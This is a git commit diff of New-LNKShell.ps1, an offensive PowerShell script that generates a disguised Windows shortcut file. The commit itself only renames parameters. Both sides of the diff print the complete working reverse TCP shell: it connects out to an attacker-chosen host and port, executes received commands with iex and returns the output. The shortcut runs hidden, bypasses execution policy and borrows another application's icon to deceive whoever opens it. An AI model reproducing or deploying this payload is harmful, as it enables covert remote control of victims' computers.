1bdceedad616c5d110f8c7565451bca96dcc0a00
leesoh <liam@liso.ca>
2016-06-07 08:31:16 -0600

    Rename parameters to align with PowerShell standards

--- New-LNKShell.ps1
+++ New-LNKShell.ps1
@@ -4,52 +4,52 @@ Creates an LNK file with an embedded reverse tcp shell. Original code from
 http://onready.me/old_horse_attacks.html. $Command can be modified, but there's a 1023-character limit on the
 length of the Arguments parameter.
 
-.PARAMETER LHOST
+.PARAMETER ComputerName
 Target for the reverse shell.
 
-.PARAMETER LPORT
-Target port on LHOST. Defaults to 4444.
+.PARAMETER Port
+Target port on ComputerName. Defaults to 4444.
 
-.PARAMETER OutPath
+.PARAMETER Path
 Target for created shortcut. Defaults to current directory.
 
-.PARAMETER Filename
+.PARAMETER Output
 Target filename. Must end in lnk. Defaults to 'payload.lnk'.
 
-.PARAMETER Run
+.PARAMETER Application
 Application to run after launching. Will update shortcut icon to match. Defaults to none.
 
 .EXAMPLE
-PS> New-LNKShell -LHOST 192.168.1.1 -LPORT 4444
+PS> New-LNKShell -ComputerName 192.168.1.1 -Port 4444 -Application calc.exe
 #>
 
 [CmdletBinding()]
 Param (
     [ValidateRange(1,65535)]
     [int]
-    $LPORT = 4444,
+    $Port = 4444,
     [Parameter(Mandatory = $True)]
     [string]
-    $LHOST,
+    $ComputerName,
     [ValidateScript({$_.Substring($_.length -4) -eq '.lnk'})]
     [string]
-    $Filename = 'payload.lnk',
+    $Output = 'payload.lnk',
     [string]
-    $Run = '%SystemRoot%\System32\Shell32.dll,21',
+    $Application = '%SystemRoot%\System32\Shell32.dll,21',
     [ValidateScript({Test-Path -Path $_})]
     [string]
-    $OutPath = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Filename)
+    $Path = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Output)
 )
 
 $Command = @"
-$Run;`$Client = New-Object System.Net.Sockets.TCPClient('$LHOST', $LPORT);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();
+$Application;`$Client = New-Object System.Net.Sockets.TCPClient('$ComputerName', $Port);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();
 "@
 
-Write-Host "[*] Creating shortcut (${LHOST}:$LPORT)"
+Write-Host "[*] Creating shortcut (${ComputerName}:$Port)"
 $WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut($OutPath)
+$Shortcut = $WshShell.CreateShortcut($Path)
 $Shortcut.TargetPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe'
-$Shortcut.IconLocation = $Run
-$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Noprofile -Command $Command"
+$Shortcut.IconLocation = $Application
+$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command $Command"
 $Shortcut.Save()
-Write-Host "[*] Shortcut created: $OutPath"
+Write-Host "[*] Shortcut created: $Path"
